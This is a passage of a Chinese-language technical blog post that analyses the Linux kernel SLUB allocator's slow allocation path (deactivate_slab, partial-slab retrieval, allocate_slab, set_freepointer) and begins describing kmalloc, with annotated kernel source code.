class="hljs-comment">/*</span><br><span class="hljs-comment"> * 结束移除 cpu slab. 合并 cpu&#x27;s freelist 与 slab&#x27;s freelist,</span><br><span class="hljs-comment"> * 解冻 slabs 并放在合适的链表上.</span><br><span class="hljs-comment"> * 假设 slab 已经被调用者安全地从 kmem_cache_cpu 上取下.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">deactivate_slab</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,</span><br><span class="hljs-params">    <span class="hljs-type">void</span> *freelist)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">slab_modes</span> &#123;</span> M_NONE, M_PARTIAL, M_FREE, M_FULL_NOLIST &#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span> =</span> get_node(s, slab_nid(slab));<br><span class="hljs-type">int</span> free_delta = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">slab_modes</span> <span class="hljs-title">mode</span> =</span> M_NONE;<br><span class="hljs-type">void</span> *nextfree, *freelist_iter, *freelist_tail;<br><span class="hljs-type">int</span> tail = DEACTIVATE_TO_HEAD;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">old</span>;</span><br><br><span class="hljs-keyword">if</span> (slab-&gt;freelist) &#123;<br>stat(s, DEACTIVATE_REMOTE_FREES);<br>tail = DEACTIVATE_TO_TAIL;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 阶段一: 统计 cpu&#x27;s freelist 上的对象数量（free_delta） </span><br><span class="hljs-comment"> * 并保存最后一个对象（freelist_tail） 用于后面的拼接.</span><br><span class="hljs-comment"> */</span><br>freelist_tail = <span class="hljs-literal">NULL</span>;<br>freelist_iter = freelist;<br><span class="hljs-keyword">while</span> (freelist_iter) &#123;<br>nextfree = get_freepointer(s, freelist_iter);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若 &#x27;nextfree&#x27; 无效, 在 &#x27;freelist_iter&#x27; 上的对象可能已被破坏.</span><br><span class="hljs-comment"> * 故通过略过 &#x27;freelist_iter&#x27; 起的所有对象来进行隔离.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (freelist_corrupted(s, slab, &amp;freelist_iter, nextfree))<br><span class="hljs-keyword">break</span>;<br><br>freelist_tail = freelist_iter;<br>free_delta++;<br><br>freelist_iter = nextfree;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 阶段二: 解冻slab并将per-cpu freelist拼接到slab&#x27;s freelist头部.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 确保链表的存在反映了在解冻期间实际的对象数量时，slab 已被解冻.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们首先在持有锁的情况下进行compxchg并当其成功时将 slab 插入链表.</span><br><span class="hljs-comment"> * 若有不匹配的情况则 slab 为未冻结且 slab 上的数量可能发生了改变.</span><br><span class="hljs-comment"> * 释放锁并再次重试 cmpxchg.</span><br><span class="hljs-comment"> */</span><br>redo:<br><br>old.freelist = READ_ONCE(slab-&gt;freelist);<br>old.counters = READ_ONCE(slab-&gt;counters);<br>VM_BUG_ON(!old.frozen);<br><br><span class="hljs-comment">/* 确定 slab 的目标状态 */</span><br>new.counters = old.counters;<br><span class="hljs-keyword">if</span> (freelist_tail) &#123;<br>new.inuse -= free_delta;<br>set_freepointer(s, freelist_tail, old.freelist);<br>new.freelist = freelist;<br>&#125; <span class="hljs-keyword">else</span><br>new.freelist = old.freelist;<br><br>new.frozen = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial) &#123;<br>mode = M_FREE;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (new.freelist) &#123;<br>mode = M_PARTIAL;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 持有自旋锁消除了acquire_slab()看到一个slab为冻结的可能性</span><br><span class="hljs-comment"> */</span><br>spin_lock_irqsave(&amp;n-&gt;list_lock, flags);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mode = M_FULL_NOLIST;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (!cmpxchg_double_slab(s, slab,<br>old.freelist, old.counters,<br>new.freelist, new.counters,<br><span class="hljs-string">&quot;unfreezing slab&quot;</span>)) &#123;<br><span class="hljs-keyword">if</span> (mode == M_PARTIAL)<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (mode == M_PARTIAL) &#123;<br>add_partial(n, slab, tail);<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>stat(s, tail);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == M_FREE) &#123;<br>stat(s, DEACTIVATE_EMPTY);<br>discard_slab(s, slab);<br>stat(s, FREE_SLAB);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == M_FULL_NOLIST) &#123;<br>stat(s, DEACTIVATE_FULL);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="④-new-slab：获取-percpu-partial-slab">④ new_slab：获取 percpu partial slab</h4><p>接下来是 <code>new_slab</code> 标签，主要就是检查若有 percpu partial slab 则从 percpu partial 链表上获取一个 slab 将其设为 percpu slab 后 再跳转回 <code>redo</code> 标签：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">new_slab:<br><br><span class="hljs-keyword">if</span> (slub_percpu_partial(c)) &#123;<span class="hljs-comment">//有 percpu partial slab</span><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(c-&gt;slab)) &#123;<span class="hljs-comment">//percpu slab 不为空，直接跳回 redo</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br><span class="hljs-keyword">if</span> (unlikely(!slub_percpu_partial(c))) &#123;<span class="hljs-comment">//被抢占然后partial空了</span><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-comment">/* 我们被抢占了且 partial 链表空了 */</span><br><span class="hljs-keyword">goto</span> new_objects;<br>&#125;<br><br><span class="hljs-comment">// 获取一张 percpu patial slab，跳回 redo</span><br>slab = c-&gt;slab = slub_percpu_partial(c);<br>slub_set_percpu_partial(c, slab);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>stat(s, CPU_PARTIAL_ALLOC);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="⑤-new-objects：获取-node-pertial-slab-或向-buddy-请求新-slab-进行分配">⑤ new_objects：获取 node pertial slab 或向 buddy 请求新 slab 进行分配</h4><p>若 percpu partial 链表也为空，那么便来到接下来的 <code>new_objects</code> 标签分配一个新的 slab，首先会设置 <code>partial_context</code>，调用 <code>get_partial()</code> 尝试从 <code>kmem_cache_node</code> 的 partial 链表分配一个 slab，若分配成功则直接跳转到 <code>check_new_slab</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">new_objects:<br><br>pc.flags = gfpflags;<br>pc.slab = &amp;slab;<br>pc.orig_size = orig_size;<br>freelist = get_partial(s, node, &amp;pc);<br><span class="hljs-keyword">if</span> (freelist)<br><span class="hljs-keyword">goto</span> check_new_slab;<br><br></code></pre></td></tr></table></figure><p><code>get_partial()</code> 首先会调用 <code>get_partial_node()</code> 从当前 node 的 <code>kmem_cache_node</code> 的 partial 链表分配 slab，若成功了则直接返回，如果失败了但是指定了分配的 node 为 <code>NUMA_NO_NODE</code>，则调用 <code>get_any_partial()</code> 从其他的 <code>kmem_cache_node</code> 的 partial 链表尝试分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 获取一个 partial slab, 加锁并返回.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">get_partial</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">int</span> node, <span class="hljs-keyword">struct</span> partial_context *pc)</span><br>&#123;<br><span class="hljs-type">void</span> *object;<br><span class="hljs-type">int</span> searchnode = node;<br><br><span class="hljs-keyword">if</span> (node == NUMA_NO_NODE)<br>searchnode = numa_mem_id();<br><br><span class="hljs-comment">// 从当前 node 的 partial 链表分配 slab</span><br>object = get_partial_node(s, get_node(s, searchnode), pc);<br><span class="hljs-keyword">if</span> (object || node != NUMA_NO_NODE)<br><span class="hljs-keyword">return</span> object;<br><br><span class="hljs-comment">// 从其他 node 的 partial 链表分配 slab</span><br><span class="hljs-keyword">return</span> get_any_partial(s, pc);<br>&#125;<br></code></pre></td></tr></table></figure><p>若 <code>get_partial()</code> 没法获取到 slab，则调用 <code>new_slab()</code> 向 buddy system 请求一份新的 slab，若失败了则直接返回：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">slub_put_cpu_ptr(s-&gt;cpu_slab);<br>slab = new_slab(s, gfpflags, node);<br>c = slub_get_cpu_ptr(s-&gt;cpu_slab);<br><br><span class="hljs-keyword">if</span> (unlikely(!slab)) &#123;<br>slab_out_of_memory(s, gfpflags, node);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>stat(s, ALLOC_SLAB);<br></code></pre></td></tr></table></figure><p><code>new_slab()</code> 最后会调用到 <code>allocate_slab()</code>：</p><ul><li>首先检查页面分配标志位，之后调用 <code>alloc_slab_page()</code> 在指定 node 上进行分配<ul><li>若 <code>node == NUMA_NO_NODE</code>，则该函数会调用 <code>alloc_pages()</code>，否则会调用 <code>__alloc_pages_node()</code></li></ul></li><li>若失败了则再次调用  <code>alloc_slab_page()</code>  尝试进行最小内存分配（<code>kmem_cache-&gt;min</code>），仍失败则直接返回 NULL</li><li>初始化 slab 各成员，并调用 <code>shuffle_freelist()</code> 为空闲对象构造随机化链表，若未开启随机化则将空闲对象按顺序连接</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> slab *<span class="hljs-title function_">allocate_slab</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span> =</span> s-&gt;oo;<br><span class="hljs-type">gfp_t</span> alloc_gfp;<br><span class="hljs-type">void</span> *start, *p, *next;<br><span class="hljs-type">int</span> idx;<br><span class="hljs-type">bool</span> shuffle;<br><br>flags &amp;= gfp_allowed_mask;<br><br>flags |= s-&gt;allocflags;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 让最初的 higher-order 分配在内存压力下失败</span><br><span class="hljs-comment"> * 由此我们返回到最小 order 的分配.</span><br><span class="hljs-comment"> */</span><br>alloc_gfp = (flags | __GFP_NOWARN | __GFP_NORETRY) &amp; ~__GFP_NOFAIL;<br><span class="hljs-keyword">if</span> ((alloc_gfp &amp; __GFP_DIRECT_RECLAIM) &amp;&amp; oo_order(oo) &gt; oo_order(s-&gt;min))<br>alloc_gfp = (alloc_gfp | __GFP_NOMEMALLOC) &amp; ~__GFP_RECLAIM;<br><br>slab = alloc_slab_page(alloc_gfp, node, oo);<br><span class="hljs-keyword">if</span> (unlikely(!slab)) &#123;<span class="hljs-comment">//分配失败，尝试最小内存分配</span><br>oo = s-&gt;min;<br>alloc_gfp = flags;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 分配可能因为碎片化而失败.</span><br><span class="hljs-comment"> * 可能的话尝试一个 lower order 的分配</span><br><span class="hljs-comment"> */</span><br>slab = alloc_slab_page(alloc_gfp, node, oo);<br><span class="hljs-keyword">if</span> (unlikely(!slab))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>stat(s, ORDER_FALLBACK);<br>&#125;<br><br>slab-&gt;objects = oo_objects(oo);<br>slab-&gt;inuse = <span class="hljs-number">0</span>;<br>slab-&gt;frozen = <span class="hljs-number">0</span>;<br><br>account_slab(slab, oo_order(oo), s, flags);<br><br>slab-&gt;slab_cache = s;<br><br>kasan_poison_slab(slab);<br><br>start = slab_address(slab);<br><br>setup_slab_debug(s, slab, start);<br><br><span class="hljs-comment">//开启了随机化会在该函数内随机连接</span><br>shuffle = shuffle_freelist(s, slab);<br><br><span class="hljs-comment">//未开启随机化，按顺序连接</span><br><span class="hljs-keyword">if</span> (!shuffle) &#123;<br>start = fixup_red_left(s, start);<br>start = setup_object(s, start);<br>slab-&gt;freelist = start;<br><span class="hljs-keyword">for</span> (idx = <span class="hljs-number">0</span>, p = start; idx &lt; slab-&gt;objects - <span class="hljs-number">1</span>; idx++) &#123;<br>next = p + s-&gt;size;<br>next = setup_object(s, next);<br>set_freepointer(s, p, next);<br>p = next;<br>&#125;<br>set_freepointer(s, p, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> slab;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用了一个函数 <code>set_freepointer()</code>，主要就是用 <code>freelist_ptr()</code> 向 <code>object + s-&gt;offset</code> 的位置写入用 <code>freelist_ptr()</code> 加密后的 <code>fp</code> 指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">set_freepointer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *object, <span class="hljs-type">void</span> *fp)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> freeptr_addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)object + s-&gt;offset;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br>BUG_ON(object == fp); <span class="hljs-comment">/* naive detection of double free or corruption */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>freeptr_addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)kasan_reset_tag((<span class="hljs-type">void</span> *)freeptr_addr);<br>*(<span class="hljs-type">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>返回 <code>___slab_alloc()</code>，如果<strong>该 kmem_cache 设置了 <code>SLAB_DEBUG_FLAGS</code> 标志位</strong>，则接下来会调用 <code>alloc_single_from_new_slab()</code> <strong>从新获取到的 slab 上分配一个对象后将 slab 重新挂回 partial/full 链表</strong>，若分配失败则跳转回 <code>new_objects</code>，成功则直接返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (kmem_cache_debug(s)) &#123;<br>freelist = alloc_single_from_new_slab(s, slab, orig_size);<br><br><span class="hljs-keyword">if</span> (unlikely(!freelist))<br><span class="hljs-keyword">goto</span> new_objects;<br><br><span class="hljs-keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)<br>set_track(s, freelist, TRACK_ALLOC, addr);<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果没有设置 <code>SLAB_DEBUG_FLAGS</code> 标志位，则接下来获取 slab 的 freelist，并调用 <code>inc_slabs_node()</code> 增加 node 上的计数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * No other reference to the slab yet so we can</span><br><span class="hljs-comment"> * muck around with it freely without cmpxchg</span><br><span class="hljs-comment"> */</span><br>freelist = slab-&gt;freelist;<br>slab-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>slab-&gt;inuse = slab-&gt;objects;<br>slab-&gt;frozen = <span class="hljs-number">1</span>;<br><br>inc_slabs_node(s, slab_nid(slab), slab-&gt;objects);<br></code></pre></td></tr></table></figure><h4 id="⑥-check-new-slab：检查-slab">⑥ check_new_slab：检查 slab</h4><p>接下来对新获取的 slab 进行检查，若该 kmem_cache 设置了 <code>SLAB_DEBUG_FLAGS</code> 标志位，检查是否设置了 <code>SLAB_STORE_USER</code> 标志位，之后直接返回 freelist</p><p>接下来调用 <code>pfmemalloc_match()</code> 检查 slab 与分配标志位是否不匹配，若是则调用 <code>deactivate_slab()</code> 使其不再活动并返回 freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">check_new_slab:<br><br><span class="hljs-keyword">if</span> (kmem_cache_debug(s)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * For debug caches here we had to go through</span><br><span class="hljs-comment"> * alloc_single_from_partial() so just store the tracking info</span><br><span class="hljs-comment"> * and return the object</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)<br>set_track(s, freelist, TRACK_ALLOC, addr);<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br><span class="hljs-keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags))) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * For !pfmemalloc_match() case we don&#x27;t load freelist so that</span><br><span class="hljs-comment"> * we don&#x27;t make further mismatched allocations easier.</span><br><span class="hljs-comment"> */</span><br>deactivate_slab(s, slab, get_freepointer(s, freelist));<br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="⑦-retry-load-slab：">⑦ retry_load_slab：</h4><p>最后就是尝试加载新获得的 slab，如果 percpu slab 不为 NULL 则使其不再活动，并设置 percpu slab &amp; freelist 为 NULL，并获取下一个 tid</p><p>最后就是将 percpu slab 设为新获取的 slab 并跳转回 <code>load_freelist</code> 分配对象并返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">retry_load_slab:<br><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(c-&gt;slab)) &#123;<br><span class="hljs-type">void</span> *flush_freelist = c-&gt;freelist;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">flush_slab</span> =</span> c-&gt;slab;<br><br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><br>deactivate_slab(s, flush_slab, flush_freelist);<br><br>stat(s, CPUSLAB_FLUSH);<br><br><span class="hljs-keyword">goto</span> retry_load_slab;<br>&#125;<br>c-&gt;slab = slab;<br><br><span class="hljs-keyword">goto</span> load_freelist;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此， slub 分配算法的核心逻辑分析结束</p><h2 id="二、kmalloc：-NUMA-NO-NODE-的通用上层分配接口">二、kmalloc： NUMA_NO_NODE 的通用上层分配接口</h2><p>我们日常生活中（？）最常用的其实还是 <code>kmalloc()</code>，其会根据分配的大小与标志位帮我们完成 <code>kmem_cache</code> 的选取并进行对象分配</p><p>函数整体逻辑比较简单：</p><ul><li>若分配的大小在编译期已知（<code>__builtin_constant_p()</code>）则判断大小：<ul><li>若大小大于 <code>KMALLOC_MAX_CACHE_SIZE</code> 则使用 <code>kmalloc_large()</code> 进行分配</li><li>通过 <code>kmalloc_index()</code> 与 <code>kmalloc_type()</code> 获取 <code>kmalloc_caches</code> 中对应的数组下标并调用 <code>kmalloc_trace</code> 进行对象分配</li></ul></li><li>若大小是动态传入的，调用 <code>__kmalloc()</code> 进行分配</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * kmalloc - 分配内核内存</span><br><span class="hljs-comment"> * @size: 需要的内存字节数.</span><br><span class="hljs-comment"> * @flags: 描述分配上下文</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * kmalloc 是内核中分配小于页面大小的内存对象的通用方法.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 被分配的对象地址至少要对齐到 ARCH_KMALLOC_MINALIGN 字节.</span><br><span class="hljs-comment"> * 对于 2^n 字节的 @size , 对齐也需要保证至少到该大小.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @flags argument 可能是 include/linux/gfp.h 中定义的GFP 标志位，描述于</span><br><span class="hljs-comment"> * :ref:`Documentation/core-api/mm-api.rst &lt;mm-api-gfp-flags&gt;`</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 推荐的对 @flags 使用描述于</span><br><span class="hljs-comment"> * :ref:`Documentation/core-api/memory-allocation.rst &lt;memory_allocation&gt;`</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 以下为最常用的 GFP 标志位简要概述</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_KERNEL</span><br><span class="hljs-comment"> *分配普通内核内存. 可能睡眠.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_NOWAIT</span><br><span class="hljs-comment"> *分配将不会睡眠.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_ATOMIC</span><br><span class="hljs-comment"> *分配将不会睡眠.  可能使用 emergency pools.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 也可以通过异或以下的一个或多个额外@flags来设置不同的标志位:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_ZERO</span><br><span class="hljs-comment"> *在返回前清零分配的内存. 也可参见 kzalloc().</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_HIGH</span><br><span class="hljs-comment"> *这个分配有着高优先级且可能使用 emergency pools.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NOFAIL</span><br><span class="hljs-comment"> *表示此次分配不允许失败</span><br><span class="hljs-comment"> *(在使用前再次思考).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NORETRY</span><br><span class="hljs-comment"> *若内存不会马上可用,立即放弃.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NOWARN</span><br><span class="hljs-comment"> *若分配失败，不要提交警告.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_RETRY_MAYFAIL</span><br><span class="hljs-comment"> *努力尝试使分配成功，但最终失败.</span><br><span 